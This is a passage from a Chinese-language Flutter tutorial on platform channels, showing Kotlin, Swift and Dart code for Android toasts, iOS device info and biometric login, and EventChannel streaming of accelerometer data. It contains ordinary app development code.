      <span class="hljs-built_in">print</span>(<span class="hljs-string">'显示Toast失败: <span class="hljs-subst">${e.message}</span>'</span>);
    }
  }
  
  <span class="hljs-comment">// 显示自定义时长Toast</span>
  <span class="hljs-keyword">static</span> Future&lt;<span class="hljs-keyword">void</span>&gt; showCustom(<span class="hljs-built_in">String</span> message, <span class="hljs-built_in">int</span> duration) <span class="hljs-keyword">async</span> {
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">await</span> _channel.invokeMethod(<span class="hljs-string">'showCustomToast'</span>, {
        <span class="hljs-string">'message'</span>: message,
        <span class="hljs-string">'duration'</span>: duration,
      });
    } <span class="hljs-keyword">on</span> PlatformException <span class="hljs-keyword">catch</span> (e) {
      <span class="hljs-built_in">print</span>(<span class="hljs-string">'显示Toast失败: <span class="hljs-subst">${e.message}</span>'</span>);
    }
  }
}
</code></pre>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// Android侧 - MainActivity.kt</span>
<span class="hljs-keyword">package</span> com.example.myapp

<span class="hljs-keyword">import</span> android.widget.Toast
<span class="hljs-keyword">import</span> io.flutter.embedding.android.FlutterActivity
<span class="hljs-keyword">import</span> io.flutter.embedding.engine.FlutterEngine
<span class="hljs-keyword">import</span> io.flutter.plugin.common.MethodChannel

<span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> : <span class="hljs-type">FlutterActivity</span>() {
    <span class="hljs-keyword">companion</span> <span class="hljs-keyword">object</span> {
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">const</span> <span class="hljs-keyword">val</span> CHANNEL = <span class="hljs-string">"com.xxxx/toast"</span>
    }
    
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">configureFlutterEngine</span><span class="hljs-params">(flutterEngine: <span class="hljs-type">FlutterEngine</span>)</span></span> {
        <span class="hljs-keyword">super</span>.configureFlutterEngine(flutterEngine)
        
        MethodChannel(
            flutterEngine.dartExecutor.binaryMessenger,
            CHANNEL
        ).setMethodCallHandler { call, result -&gt;
            <span class="hljs-comment">// 主线程执行UI操作</span>
            runOnUiThread {
                <span class="hljs-keyword">when</span> (call.method) {
                    <span class="hljs-string">"showShortToast"</span> -&gt; {
                        <span class="hljs-keyword">val</span> message = call.arguments <span class="hljs-keyword">as</span>? String
                        Toast.makeText(
                            <span class="hljs-keyword">this</span>,
                            message ?: <span class="hljs-string">""</span>,
                            Toast.LENGTH_SHORT
                        ).show()
                        result.success(<span class="hljs-literal">null</span>)
                    }
                    
                    <span class="hljs-string">"showLongToast"</span> -&gt; {
                        <span class="hljs-keyword">val</span> message = call.arguments <span class="hljs-keyword">as</span>? String
                        Toast.makeText(
                            <span class="hljs-keyword">this</span>,
                            message ?: <span class="hljs-string">""</span>,
                            Toast.LENGTH_LONG
                        ).show()
                        result.success(<span class="hljs-literal">null</span>)
                    }
                    
                    <span class="hljs-string">"showCustomToast"</span> -&gt; {
                        <span class="hljs-keyword">val</span> arguments = call.arguments <span class="hljs-keyword">as</span>? Map&lt;*, *&gt;
                        <span class="hljs-keyword">val</span> message = arguments?.<span class="hljs-keyword">get</span>(<span class="hljs-string">"message"</span>) <span class="hljs-keyword">as</span>? String
                        <span class="hljs-keyword">val</span> duration = arguments?.<span class="hljs-keyword">get</span>(<span class="hljs-string">"duration"</span>) <span class="hljs-keyword">as</span>? <span class="hljs-built_in">Int</span> ?: <span class="hljs-number">2000</span>
                        
                        <span class="hljs-comment">// 自定义Toast</span>
                        <span class="hljs-keyword">val</span> toast = Toast.makeText(<span class="hljs-keyword">this</span>, message ?: <span class="hljs-string">""</span>, Toast.LENGTH_SHORT)
                        
                        <span class="hljs-comment">// Android的Toast不支持直接设置毫秒数，这是一个简单的案例明白如何用即可</span>
                        <span class="hljs-comment">// 实际项目中需要自定义View</span>
                        toast.duration = <span class="hljs-keyword">if</span> (duration &gt; <span class="hljs-number">2000</span>) Toast.LENGTH_LONG <span class="hljs-keyword">else</span> Toast.LENGTH_SHORT
                        toast.show()
                        
                        result.success(<span class="hljs-literal">null</span>)
                    }
                    
                    <span class="hljs-keyword">else</span> -&gt; result.notImplemented()
                }
            }
        }
    }
}
</code></pre>
<h3 data-id="heading-13">三、与iOS原生交互</h3>
<h4 data-id="heading-14">3.1 iOS与Android的差异</h4>
<p>在开始iOS开发前，需要了解一些iOS与Android两端的差异：</p>






























<table><thead><tr><th>维度</th><th>Android (Kotlin/Java)</th><th>iOS (Swift/OC)</th></tr></thead><tbody><tr><td>项目结构</td><td>MainActivity.kt</td><td>AppDelegate.swift</td></tr><tr><td>管道注册</td><td>configureFlutterEngine</td><td>application didFinishLaunchingWithOptions</td></tr><tr><td>内存管理</td><td>JVM自动垃圾回收</td><td>ARC自动引用计数</td></tr><tr><td>平台特性</td><td>Context对象</td><td>UIViewController</td></tr></tbody></table>
<h4 data-id="heading-15">3.2 以获取iOS设备信息为例</h4>
<h5 data-id="heading-16">iOS侧代码（Swift）</h5>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// AppDelegate.swift</span>
<span class="hljs-keyword">import</span> UIKit
<span class="hljs-keyword">import</span> Flutter

<span class="hljs-keyword">@UIApplicationMain</span>
<span class="hljs-keyword">@objc</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AppDelegate</span>: <span class="hljs-title class_">FlutterAppDelegate</span> {
    <span class="hljs-keyword">override</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">application</span>(
        <span class="hljs-keyword">_</span> <span class="hljs-params">application</span>: <span class="hljs-type">UIApplication</span>,
        <span class="hljs-params">didFinishLaunchingWithOptions</span> <span class="hljs-params">launchOptions</span>: [<span class="hljs-type">UIApplication</span>.<span class="hljs-params">LaunchOptionsKey</span>: <span class="hljs-keyword">Any</span>]<span class="hljs-operator">?</span>
    ) -&gt; <span class="hljs-type">Bool</span> {
        <span class="hljs-comment">// 1. 获取FlutterViewController</span>
        <span class="hljs-keyword">let</span> controller: <span class="hljs-type">FlutterViewController</span> <span class="hljs-operator">=</span> window<span class="hljs-operator">?</span>.rootViewController <span class="hljs-keyword">as!</span> <span class="hljs-type">FlutterViewController</span>
        
        <span class="hljs-comment">// 2. 创建MethodChannel</span>
        <span class="hljs-keyword">let</span> batteryChannel <span class="hljs-operator">=</span> <span class="hljs-type">FlutterMethodChannel</span>(
            name: <span class="hljs-string">"com.xxxx/battery"</span>,
            binaryMessenger: controller.binaryMessenger
        )
        
        <span class="hljs-comment">// 3. 设置方法处理器</span>
        batteryChannel.setMethodCallHandler { [<span class="hljs-keyword">weak</span> <span class="hljs-keyword">self</span>] (call: <span class="hljs-type">FlutterMethodCall</span>, result: <span class="hljs-keyword">@escaping</span> <span class="hljs-type">FlutterResult</span>) <span class="hljs-keyword">in</span>
            <span class="hljs-comment">// 4. 根据方法名分派处理</span>
            <span class="hljs-keyword">if</span> call.method <span class="hljs-operator">==</span> <span class="hljs-string">"getBatteryLevel"</span> {
                <span class="hljs-keyword">self</span><span class="hljs-operator">?</span>.receiveBatteryLevel(result: result)
            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> call.method <span class="hljs-operator">==</span> <span class="hljs-string">"getDeviceInfo"</span> {
                <span class="hljs-keyword">self</span><span class="hljs-operator">?</span>.getDeviceInfo(result: result)
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-comment">// 5. 未实现的方法</span>
                result(<span class="hljs-type">FlutterMethodNotImplemented</span>)
            }
        }
        
        <span class="hljs-type">GeneratedPluginRegistrant</span>.register(with: <span class="hljs-keyword">self</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">super</span>.application(application, didFinishLaunchingWithOptions: launchOptions)
    }
    
    <span class="hljs-comment">// 获取电池电量</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">receiveBatteryLevel</span>(<span class="hljs-params">result</span>: <span class="hljs-type">FlutterResult</span>) {
        <span class="hljs-comment">// 6. 获取设备对象</span>
        <span class="hljs-keyword">let</span> device <span class="hljs-operator">=</span> <span class="hljs-type">UIDevice</span>.current
        
        <span class="hljs-comment">// 7. 开启电池监控</span>
        device.isBatteryMonitoringEnabled <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>
        
        <span class="hljs-comment">// 8. 获取电池状态</span>
        <span class="hljs-keyword">if</span> device.batteryState <span class="hljs-operator">==</span> .unknown {
            <span class="hljs-comment">// 9. 无法获取电量</span>
            result(<span class="hljs-type">FlutterError</span>(
                code: <span class="hljs-string">"UNAVAILABLE"</span>,
                message: <span class="hljs-string">"电池信息不可用"</span>,
                details: <span class="hljs-literal">nil</span>
            ))
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// 10. 计算电量百分比</span>
            <span class="hljs-keyword">let</span> batteryLevel <span class="hljs-operator">=</span> <span class="hljs-type">Int</span>(device.batteryLevel <span class="hljs-operator">*</span> <span class="hljs-number">100</span>)
            result(batteryLevel)
        }
    }
    
    <span class="hljs-comment">// 获取设备信息</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">getDeviceInfo</span>(<span class="hljs-params">result</span>: <span class="hljs-type">FlutterResult</span>) {
        <span class="hljs-keyword">let</span> device <span class="hljs-operator">=</span> <span class="hljs-type">UIDevice</span>.current
        
        <span class="hljs-comment">// 11. 设备信息字典</span>
        <span class="hljs-keyword">let</span> deviceInfo: [<span class="hljs-type">String</span>: <span class="hljs-keyword">Any</span>] <span class="hljs-operator">=</span> [
            <span class="hljs-string">"name"</span>: device.name,
            <span class="hljs-string">"model"</span>: device.model,
            <span class="hljs-string">"systemName"</span>: device.systemName,
            <span class="hljs-string">"systemVersion"</span>: device.systemVersion,
            <span class="hljs-string">"identifierForVendor"</span>: device.identifierForVendor<span class="hljs-operator">?</span>.uuidString <span class="hljs-operator">??</span> <span class="hljs-string">""</span>,
            <span class="hljs-string">"batteryLevel"</span>: device.batteryLevel,
            <span class="hljs-string">"batteryState"</span>: <span class="hljs-string">"<span class="hljs-subst">\(device.batteryState)</span>"</span>,
            <span class="hljs-string">"isBatteryMonitoringEnabled"</span>: device.isBatteryMonitoringEnabled,
            <span class="hljs-string">"proximityState"</span>: device.proximityState,
            <span class="hljs-string">"isProximityMonitoringEnabled"</span>: device.isProximityMonitoringEnabled,
            <span class="hljs-string">"orientation"</span>: <span class="hljs-string">"<span class="hljs-subst">\(device.orientation)</span>"</span>,
            <span class="hljs-string">"isMultitaskingSupported"</span>: device.isMultitaskingSupported,
            <span class="hljs-string">"userInterfaceIdiom"</span>: <span class="hljs-string">"<span class="hljs-subst">\(device.userInterfaceIdiom)</span>"</span>
        ]
        
        <span class="hljs-comment">// 12. 返回结果</span>
        result(deviceInfo)
    }
}
</code></pre>
<h5 data-id="heading-17">Dart侧代码</h5>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// ios_device_info.dart</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:flutter/services.dart'</span>;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">IOSDeviceInfo</span> </span>{
  <span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> MethodChannel _channel = 
      MethodChannel(<span class="hljs-string">'com.xxxx/battery'</span>);
  
  <span class="hljs-comment">// 获取iOS设备信息</span>
  <span class="hljs-keyword">static</span> Future&lt;<span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>, <span class="hljs-built_in">dynamic</span>&gt;&gt; getDeviceInfo() <span class="hljs-keyword">async</span> {
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">final</span> <span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">dynamic</span>, <span class="hljs-built_in">dynamic</span>&gt; info = 
          <span class="hljs-keyword">await</span> _channel.invokeMethod(<span class="hljs-string">'getDeviceInfo'</span>);
      
      <span class="hljs-comment">// 转换为明确的类型</span>
      <span class="hljs-keyword">return</span> <span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>, <span class="hljs-built_in">dynamic</span>&gt;.from(info);
    } <span class="hljs-keyword">on</span> PlatformException <span class="hljs-keyword">catch</span> (e) {
      <span class="hljs-built_in">print</span>(<span class="hljs-string">'获取设备信息失败: <span class="hljs-subst">${e.message}</span>'</span>);
      <span class="hljs-keyword">return</span> {};
    }
  }
  
  <span class="hljs-comment">// 获取电池电量</span>
  <span class="hljs-keyword">static</span> Future&lt;<span class="hljs-built_in">int</span>&gt; getBatteryLevel() <span class="hljs-keyword">async</span> {
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">final</span> <span class="hljs-built_in">int</span> level = <span class="hljs-keyword">await</span> _channel.invokeMethod(<span class="hljs-string">'getBatteryLevel'</span>);
      <span class="hljs-keyword">return</span> level;
    } <span class="hljs-keyword">on</span> PlatformException <span class="hljs-keyword">catch</span> (e) {
      <span class="hljs-built_in">print</span>(<span class="hljs-string">'获取电量失败: <span class="hljs-subst">${e.message}</span>'</span>);
      <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;
    }
  }
}
</code></pre>
<h4 data-id="heading-18">3.3 iOS特有功能：使用Face ID/Touch ID</h4>
<p>iOS的生物识别是一个很好的平台特定功能示例：</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// AppDelegate.swift 中添加</span>
<span class="hljs-keyword">import</span> LocalAuthentication

<span class="hljs-keyword">extension</span> <span class="hljs-title class_">AppDelegate</span> {
    <span class="hljs-comment">// 生物识别验证</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">authenticateWithBiometrics</span>(<span class="hljs-params">result</span>: <span class="hljs-keyword">@escaping</span> <span class="hljs-type">FlutterResult</span>) {
        <span class="hljs-keyword">let</span> context <span class="hljs-operator">=</span> <span class="hljs-type">LAContext</span>()
        <span class="hljs-keyword">var</span> error: <span class="hljs-type">NSError</span>?
        
        <span class="hljs-comment">// 1. 检查设备是否支持生物识别</span>
        <span class="hljs-keyword">if</span> context.canEvaluatePolicy(.deviceOwnerAuthenticationWithBiometrics, error: <span class="hljs-operator">&amp;</span>error) {
            <span class="hljs-keyword">let</span> reason <span class="hljs-operator">=</span> <span class="hljs-string">"请进行生物识别以继续"</span>
            
            <span class="hljs-comment">// 2. 执行验证</span>
            context.evaluatePolicy(.deviceOwnerAuthenticationWithBiometrics, 
                                  localizedReason: reason) { success, authenticationError <span class="hljs-keyword">in</span>
                <span class="hljs-comment">// 3. 主线程返回结果</span>
                <span class="hljs-type">DispatchQueue</span>.main.async {
                    <span class="hljs-keyword">if</span> success {
                        <span class="hljs-comment">// 4. 验证成功</span>
                        result([<span class="hljs-string">"success"</span>: <span class="hljs-literal">true</span>, <span class="hljs-string">"message"</span>: <span class="hljs-string">"验证成功"</span>])
                    } <span class="hljs-keyword">else</span> {
                        <span class="hljs-comment">// 5. 验证失败</span>
                        <span class="hljs-keyword">let</span> errorMessage: <span class="hljs-type">String</span>
                        
                        <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> laError <span class="hljs-operator">=</span> authenticationError <span class="hljs-keyword">as?</span> <span class="hljs-type">LAError</span> {
                            <span class="hljs-keyword">switch</span> laError.code {
                            <span class="hljs-keyword">case</span> .userCancel:
                                errorMessage <span class="hljs-operator">=</span> <span class="hljs-string">"用户取消"</span>
                            <span class="hljs-keyword">case</span> .userFallback:
                                errorMessage <span class="hljs-operator">=</span> <span class="hljs-string">"用户选择使用密码"</span>
                            <span class="hljs-keyword">case</span> .authenticationFailed:
                                errorMessage <span class="hljs-operator">=</span> <span class="hljs-string">"验证失败"</span>
                            <span class="hljs-keyword">case</span> .passcodeNotSet:
                                errorMessage <span class="hljs-operator">=</span> <span class="hljs-string">"未设置密码"</span>
                            <span class="hljs-keyword">case</span> .systemCancel:
                                errorMessage <span class="hljs-operator">=</span> <span class="hljs-string">"系统取消"</span>
                            <span class="hljs-keyword">case</span> .biometryNotAvailable:
                                errorMessage <span class="hljs-operator">=</span> <span class="hljs-string">"生物识别不可用"</span>
                            <span class="hljs-keyword">case</span> .biometryNotEnrolled:
                                errorMessage <span class="hljs-operator">=</span> <span class="hljs-string">"未录入生物信息"</span>
                            <span class="hljs-keyword">case</span> .biometryLockout:
                                errorMessage <span class="hljs-operator">=</span> <span class="hljs-string">"生物识别被锁定"</span>
                            <span class="hljs-keyword">default</span>:
                                errorMessage <span class="hljs-operator">=</span> <span class="hljs-string">"未知错误"</span>
                            }
                        } <span class="hljs-keyword">else</span> {
                            errorMessage <span class="hljs-operator">=</span> <span class="hljs-string">"未知错误"</span>
                        }
                        
                        result(<span class="hljs-type">FlutterError</span>(
                            code: <span class="hljs-string">"AUTH_FAILED"</span>,
                            message: errorMessage,
                            details: <span class="hljs-literal">nil</span>
                        ))
                    }
                }
            }
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// 6. 设备不支持生物识别</span>
            <span class="hljs-keyword">let</span> errorMessage <span class="hljs-operator">=</span> error<span class="hljs-operator">?</span>.localizedDescription <span class="hljs-operator">??</span> <span class="hljs-string">"设备不支持生物识别"</span>
            result(<span class="hljs-type">FlutterError</span>(
                code: <span class="hljs-string">"NOT_SUPPORTED"</span>,
                message: errorMessage,
                details: <span class="hljs-literal">nil</span>
            ))
        }
    }
    
    <span class="hljs-comment">// 在setMethodCallHandler中添加</span>
    <span class="hljs-comment">// batteryChannel.setMethodCallHandler { [weak self] (call, result) in</span>
    <span class="hljs-comment">//     if call.method == "authenticateWithBiometrics" {</span>
    <span class="hljs-comment">//         self?.authenticateWithBiometrics(result: result)</span>
    <span class="hljs-comment">//     }</span>
    <span class="hljs-comment">// }</span>
}
</code></pre>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// dart侧</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BiometricAuth</span> </span>{
  <span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> MethodChannel _channel = 
      MethodChannel(<span class="hljs-string">'com.xxxx/battery'</span>);
  
  <span class="hljs-keyword">static</span> Future&lt;<span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>, <span class="hljs-built_in">dynamic</span>&gt;&gt; authenticate() <span class="hljs-keyword">async</span> {
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">final</span> result = <span class="hljs-keyword">await</span> _channel.invokeMethod(<span class="hljs-string">'authenticateWithBiometrics'</span>);
      <span class="hljs-keyword">return</span> <span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>, <span class="hljs-built_in">dynamic</span>&gt;.from(result);
    } <span class="hljs-keyword">on</span> PlatformException <span class="hljs-keyword">catch</span> (e) {
      <span class="hljs-keyword">return</span> {
        <span class="hljs-string">'success'</span>: <span class="hljs-keyword">false</span>,
        <span class="hljs-string">'message'</span>: e.message ?? <span class="hljs-string">'验证失败'</span>,
        <span class="hljs-string">'errorCode'</span>: e.code,
      };
    }
  }
}
</code></pre>
<h4 data-id="heading-19">3.4 iOS与Android的兼容性处理</h4>
<p>在实际插件开发中，我们经常需要处理平台之间差异：</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// 工具类</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PlatformUtils</span> </span>{
  <span class="hljs-keyword">static</span> <span class="hljs-built_in">bool</span> <span class="hljs-keyword">get</span> isAndroid =&gt; Platform.isAndroid;
  <span class="hljs-keyword">static</span> <span class="hljs-built_in">bool</span> <span class="hljs-keyword">get</span> isIOS =&gt; Platform.isIOS;
  <span class="hljs-keyword">static</span> <span class="hljs-built_in">bool</span> <span class="hljs-keyword">get</span> isMobile =&gt; Platform.isAndroid || Platform.isIOS;
  
  <span class="hljs-comment">// 平台特定的提示</span>
  <span class="hljs-keyword">static</span> Future&lt;<span class="hljs-keyword">void</span>&gt; showPlatformToast(<span class="hljs-built_in">String</span> message) <span class="hljs-keyword">async</span> {
    <span class="hljs-keyword">if</span> (isAndroid) {
      <span class="hljs-keyword">await</span> AndroidToast.showShort(message);
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (isIOS) {
      <span class="hljs-comment">// iOS没有Toast，使用其他方式</span>
      <span class="hljs-keyword">await</span> _showIOSToastLike(message);
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-comment">// Web或桌面端</span>
      <span class="hljs-built_in">print</span>(<span class="hljs-string">'Toast: <span class="hljs-subst">$message</span>'</span>);
    }
  }
  
  <span class="hljs-keyword">static</span> Future&lt;<span class="hljs-keyword">void</span>&gt; _showIOSToastLike(<span class="hljs-built_in">String</span> message) <span class="hljs-keyword">async</span> {
    <span class="hljs-comment">// iOS上可以使用其他方式模拟Toast</span>
    <span class="hljs-comment">// 比如使用SnackBar或自定义View</span>
  }
}
</code></pre>
<h3 data-id="heading-20">四、EventChannel</h3>
<p>如何实现从原生到Dart的持续数据流？</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
    subgraph "Android/iOS原生侧"
        A[数据源&lt;br/&gt;传感器/位置/GPS] --&gt; B[EventChannel.EventSink]
        B --&gt; C[BinaryMessenger发送]
    end
    
    subgraph "Dart侧"
        C --&gt; D[StreamController]
        D --&gt; E[Stream]
        E --&gt; F[StreamBuilder/widget]
    end
    
    style B fill:#9f9
    style E fill:#f99
</code></pre>
<p><strong>关键组件</strong>：</p>
<ol>
<li><strong>EventSink</strong>：原生侧的数据发射器</li>
<li><strong>Stream</strong>：Dart侧的响应式数据流</li>
<li><strong>StreamHandler</strong>：连接两者的桥梁</li>
</ol>
<h4 data-id="heading-21">4.1 EventChannel与MethodChannel的区别</h4>



































<table><thead><tr><th>维度</th><th>MethodChannel</th><th>EventChannel</th></tr></thead><tbody><tr><td>通信方向</td><td>双向</td><td>主要是原生→Dart</td></tr><tr><td>通信模式</td><td>请求-响应</td><td>事件流/数据流</td></tr><tr><td>使用场景</td><td>方法调用</td><td>实时数据</td></tr><tr><td>连接状态</td><td>短连接</td><td>长连接</td></tr><tr><td>性能影响</td><td>每次调用都建立连接</td><td>一次建立，多次传输</td></tr></tbody></table>
<h4 data-id="heading-22">4.2 以监听传感器数据为例</h4>
<h5 data-id="heading-23">Android侧（Kotlin）</h5>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// SensorEventPlugin.kt</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">SensorEventPlugin</span>(<span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> context: Context) : 
    StreamHandler {
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> sensorManager: SensorManager? = <span class="hljs-literal">null</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> accelerometerSensor: Sensor? = <span class="hljs-literal">null</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> eventSink: EventChannel.EventSink? = <span class="hljs-literal">null</span>
    
    <span class="hljs-keyword">companion</span> <span class="hljs-keyword">object</span> {
        <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">registerWith</span><span class="hljs-params">(registrar: <span class="hljs-type">Registrar</span>)</span></span> {
            <span class="hljs-keyword">val</span> channel = EventChannel(
                registrar.messenger(), 
                <span class="hljs-string">"com.xxxx/sensor"</span>
            )
            <span class="hljs-keyword">val</span> plugin = SensorEventPlugin(registrar.context())
            channel.setStreamHandler(plugin)
        }
    }
    
    <span class="hljs-comment">// 1. 监听</span>
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onListen</span><span class="hljs-params">(arguments: <span class="hljs-type">Any</span>?, events: <span class="hljs-type">EventChannel</span>.<span class="hljs-type">EventSink</span>?)</span></span> {
        eventSink = events
        
        <span class="hljs-comment">// 2. 初始化传感器</span>
        sensorManager = context.getSystemService(Context.SENSOR_SERVICE) <span class="hljs-keyword">as</span> SensorManager
        accelerometerSensor = sensorManager?.getDefaultSensor(Sensor.TYPE_ACCELEROMETER)
        
        <span class="hljs-comment">// 3. 注册传感器监听器</span>
        sensorManager?.registerListener(
            sensorListener,
            accelerometerSensor,
            SensorManager.SENSOR_DELAY_NORMAL
        )
    }
    
    <span class="hljs-comment">// 4. 监听停止</span>
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onCancel</span><span class="hljs-params">(arguments: <span class="hljs-type">Any</span>?)</span></span> {
        <span class="hljs-comment">// 5. 取消传感器监听</span>
        sensorManager?.unregisterListener(sensorListener)
        sensorManager = <span class="hljs-literal">null</span>
        accelerometerSensor = <span class="hljs-literal">null</span>
        eventSink = <span class="hljs-literal">null</span>
    }
    
    <span class="hljs-comment">// 6. 传感器监听器</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> sensorListener = <span class="hljs-keyword">object</span> : SensorEventListener {
        <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onSensorChanged</span><span class="hljs-params">(event: <span class="hljs-type">SensorEvent</span>?)</span></span> {
            event?.let {
                <span class="hljs-comment">// 7. 获取加速度数据</span>
                <span class="hljs-keyword">val</span> x = it.values[<span class="hljs-number">0</span>]
                <span class="hljs-keyword">val</span> y = it.values[<span class="hljs-number">1</span>]
                <span class="hljs-keyword">val</span> z = it.values[<span class="hljs-number">2</span>]
                
                <span class="hljs-comment">// 8. 发送到Dart</span>
                eventSink?.success(mapOf(
                    <span class="hljs-string">"x"</span> to x,
                    <span class="hljs-string">"y"</span> to y,
                    <span class="hljs-string">"z"</span> to z,
                    <span class="hljs-string">"timestamp"</span> to System.currentTimeMillis()
                ))
            }
        }
        
        <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onAccuracyChanged</span><span class="hljs-params">(sensor: <span class="hljs-type">Sensor</span>?, accuracy: <span class="hljs-type">Int</span>)</span></span> {
            <span class="hljs-comment">// .....</span>
        }
    }
}
</code></pre>
<h5 data-id="heading-24">Dart侧</h5>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// sensor_stream.dart</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:flutter/services.dart'</span>;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SensorStream</span> </span>{
  <span class="hljs-keyword">final</span> EventChannel _channel = EventChannel(<span class="hljs-string">'com.xxxx/sensor'</span>);
  Stream&lt;<span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>, <span class="hljs-built_in">dynamic</span>&gt;&gt;? _stream;
  
  <span class="hljs-comment">// 获取传感器数据流</span>
  Stream&lt;<span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>, <span class="hljs-built_in">dynamic</span>&gt;&gt; <span class="hljs-keyword">get</span> sensorStream {
    _stream ??= _channel
        .receiveBroadcastStream()
        .map((data) =&gt; <span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>, <span class="hljs-built_in">dynamic</span>&gt;.from(data));
    <span class="hljs-keyword">return</span> _stream!;
  }
  
  <span class="hljs-comment">// 使用</span>
  <span class="hljs-keyword">void</span> startListening() {
    sensorStream.listen((data) {
      <span class="hljs-built_in">print</span>(<span class="hljs-string">'加速度: X=<span class="hljs-subst">${data[<span class="hljs-string">'x'</span>]}</span>, Y=<span class="hljs-subst">${data[<span class="hljs-string">'y'</span>]}</span>, Z=<span class="hljs-subst">${data[<span class="hljs-string">'z'</span>]}</span>'</span>);
      
      <span class="hljs-comment">// 计算设备倾斜角度</span>
      <span class="hljs-built_in">double</span> pitch = <span class="hljs-number">180</span> * atan(data[<span class="hljs-string">'x'</span>] / sqrt(pow(data[<span class="hljs-string">'y'</span>], <span class="hljs-number">2</span>) + pow(data[<span class="hljs-string">'z'</span>], <span class="hljs-number">2</span>))) / pi;
      <span class="hljs-built_in">double</span> roll = <span class="hljs-number">180</span> * atan(data[<span class="hljs-string">'y'</span>] / sqrt(pow(data[<span class="hljs-string">'x'</span>], <span class="hljs-number">2</span>) + pow(data[<span class="hljs-string">'z'</span>], <span class="hljs-number">2</span>))) / pi;
      
      <span class="hljs-built_in">print</span>(<span class="hljs-string">'倾斜角度: Pitch=<span class="hljs-subst">$pitch</span>°, Roll=<span class="hljs-subst">$roll</span>°'</span>);
    }, onError: (error) {
      <span class="hljs-built_in">print</span>(<span class="hljs-string">'传感器错误: <span class="hljs-subst">$error</span>'</span>);
    }, onDone: () {
      <span class="hljs-built_in">print</span>(<span class="hljs-string">'传感器监听结束'</span>);
    });
  }
  
  <span class="hljs-comment">// 在Widget中使用</span>
  Widget buildSensorWidget() {
    <span class="hljs-keyword">return</span> StreamBuilder&lt;<span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>, <span class="hljs-built_in">dynamic</span>&gt;&gt;(
      stream: sensorStream,
      builder: (context, snapshot) {
        <span class="hljs-keyword">if</span> (snapshot.hasData) {
          <span class="hljs-keyword">final</span> data = snapshot.data!;
          <span class="hljs-keyword">return</span> Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              Text(<span class="hljs-string">'X: <span class="hljs-subst">${data[<span class="hljs-string">'x'</span>].toStringAsFixed(<span class="hljs-number">2</span>)}</span>'</span>),
              Text(<span class="hljs-string">'Y: <span class="hljs-subst">${data[<span class="hljs-string">'y'</span>].toStringAsFixed(<span class="hljs-number">2</span>)}</span>'</span>),
              Text(<span class="hljs-string">'Z: <span class="hljs-subst">${data[<span class="hljs-string">'z'</span>].toStringAsFixed(<span class="hljs-number">2</span>)}</span>'</span>),
              <span class="hljs-comment">// 展示</span>
              CustomPaint(
                painter: AccelerometerPainter(data),
